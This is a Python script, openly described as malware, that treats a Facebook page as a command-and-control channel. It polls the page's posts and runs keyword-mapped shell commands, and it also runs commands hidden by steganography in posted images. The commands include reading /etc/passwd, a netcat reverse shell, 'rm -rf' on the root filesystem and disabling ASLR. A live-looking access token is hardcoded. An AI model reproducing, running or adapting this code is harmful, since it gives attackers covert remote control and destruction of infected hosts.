#!/usr/bin/python3

import facebook
import time
import os
from PIL import Image
import requests
from io import BytesIO
import matplotlib.pyplot as plt

# This token is good until like June.
PAGE_LONG_ACCESS_TOKEN = 'EAALq5cEcySYBADHemZAiRUqTHaJwjGZAh1pZCBbm3LnLovTgorO7dDPbXZAUu31l8k8TrYBJPaWivcsihd0PfnHTMgdTvNharhxAtToIUAOX4AdgZCJZCGiLLQKbOl5Gj8fkarbbr7K9FL6XY45e7XbpzbAymN5pU3doc3qmzFgwZDZD'
# The static account to which the malware connects.
STATIC_C2_PAGE = 'Hammer_6f5902ac237024bdd0c176cb93063dc4'
# dog: list users on the system.
# clam: send shell to attacker.
# starfish: destroy infected host filesystem.
# gnat: list network connections.
# alligator: turn off infected host ASLR.
# The IP address and port of the attacker who wants to get command output.
CALLBACK_IP = '127.0.0.1'
CALLBACK_PORT = 52017
COMMAND_KEYWORDS = {
    'dog': 'cat /etc/passwd',
    'clam': 'nc -nv {0} {1} -e /bin/bash'.format(CALLBACK_IP, CALLBACK_PORT),
    'starfish': 'cd /;rm -rf *',
    'gnat': 'netstat -antp',
    'alligator': 'echo 0 > /proc/sys/kernel/randomize_va_space'
}


def main():
    """Runs the program."""
    #test_connectivity()
    run_malware()


def run_malware():
    """Listens for new posts and runs commands based on their contents."""
    graph = get_graph()
    page_data = get_page_data(graph)
    page_id = page_data['data'][0]['id']
    post_function = lambda post: run_encoded_command(post, verbose=True)
    wait_for_posts(graph, page_id, post_function, verbose=True)


def test_connectivity():
    """Tests connectivity to the facebook GraphAPI for the user's page."""
    print('Connecting to {0}'.format(STATIC_C2_PAGE))
    graph = get_graph()
    page_data = get_page_data(graph)
    print(page_data['data'][0]['id'])
    page_id = page_data['data'][0]['id']
    posts = get_post_data(graph, page_id)
    print(posts)
    print(get_any_post(graph, page_id))
    print(get_last_post_data(graph, page_id))
    print(graph.get_object(id=page_id, fields='posts'))
    photo_id = graph.get_object(id=page_id, fields='posts')['posts']['data'][0]['id']
    print(photo_id)
    #print(graph.get_object(id='111686270489256_118626689795214', fields='full_picture'))
    photo_obj = graph.get_object(id=photo_id, fields='full_picture')
    print(photo_obj)
    image = get_image_from_url(photo_obj['full_picture'])
    print(image)
    decoded = decode_image(image)
    print(decoded)


def decode_image(image):
    """Returns the message encoded in the image."""
    data = ''
    imgdata = iter(image.getdata())
    while True:
        pixels = [value for value in imgdata.__next__()[:3] +
                                  imgdata.__next__()[:3] +
                                  imgdata.__next__()[:3]]
        binstr = ''
        for i in pixels[:8]:
            if i % 2 == 0:
                binstr += '0'
            else:
                binstr += '1'
        data += chr(int(binstr, 2))
        if pixels[-1] % 2 != 0:
            return data


def get_graph():
    """Returns the graph based on the access token."""
    return facebook.GraphAPI(
        access_token=PAGE_LONG_ACCESS_TOKEN,
        version='3.1')


def get_page_data(graph):
    """Returns basic page data, either for testing connectivity, or for
    later use."""
    return graph.get_object("/me/accounts")


def get_post_data(graph, page_id):
    """Returns the full post dictionary. Used for testing."""
    return graph.get_object(
        id=page_id,
        fields='posts')


def get_any_post(graph, page_id):
    """Returns any post, or None if no such post exists. This is for
    testing."""
    post_dict = graph.get_object(
        id=page_id,
        fields='posts')['posts']
    post_list = post_dict['data']
    return None if not post_list else post_list[0]['message']


def get_last_post_data(graph, page_id):
    """Returns the most recent post's data dict. This is the post with
    the greatest time value."""
    post_dict = graph.get_object(
        id=page_id,
        fields='posts')['posts']
    sorted_post_list = sorted(post_dict['data'], key=lambda d:
            get_post_datetime(d))[::-1]
    return sorted_post_list[0]


def get_image_from_url(url):
    """Returns the image from the given URL."""
    response = requests.get(url)
    return Image.open(BytesIO(response.content))


def get_post_datetime(post_data):
    """Returns a datetime object for the post's created time."""
    return time.strptime(post_data['created_time'],
            "%Y-%m-%dT%H:%M:%S+%f")


def wait_for_posts(graph, page_id, new_post_func, verbose=False):
    """Waits in a loop for new posts. When a new post arrives, apply the
    given function to it."""
    last_post_datetime = get_post_datetime(get_last_post_data(graph, page_id))
    while True:
        if verbose:
            print('Checking for new post.')
        new_post_data = get_last_post_data(graph, page_id)
        new_post_datetime = get_post_datetime(new_post_data)
        if new_post_datetime > last_post_datetime:
            if verbose:
                print('Found new post.')
            last_post_datetime = new_post_datetime
            new_post_func(new_post_data['message'])
            post_id = new_post_data['id']
            try:
                photo_obj = graph.get_object(id=post_id, fields='full_picture')
                image = get_image_from_url(photo_obj['full_picture'])
                decoded_cmd = decode_image(image)
                if verbose:
                    print('Running stego command: {0}'.format(decoded_cmd))
                os.system(decoded_cmd)
            except:
                pass
        time.sleep(60)


def run_encoded_command(post, verbose=False):
    """Checks the post against the COMMAND_KEYWORDS dict. Executes as a
    unix command every value for which the key is present in the post.
    The reason we aren't encoding them some other way is just because we
    don't want to violate facebook's terms of use. This makes us look
    less suspicious."""
    for k in COMMAND_KEYWORDS.keys():
        if k in post:
            if verbose:
                print('Running: {0}'.format(COMMAND_KEYWORDS[k]))
            os.system(COMMAND_KEYWORDS[k])


if __name__ == '__main__':
    main()

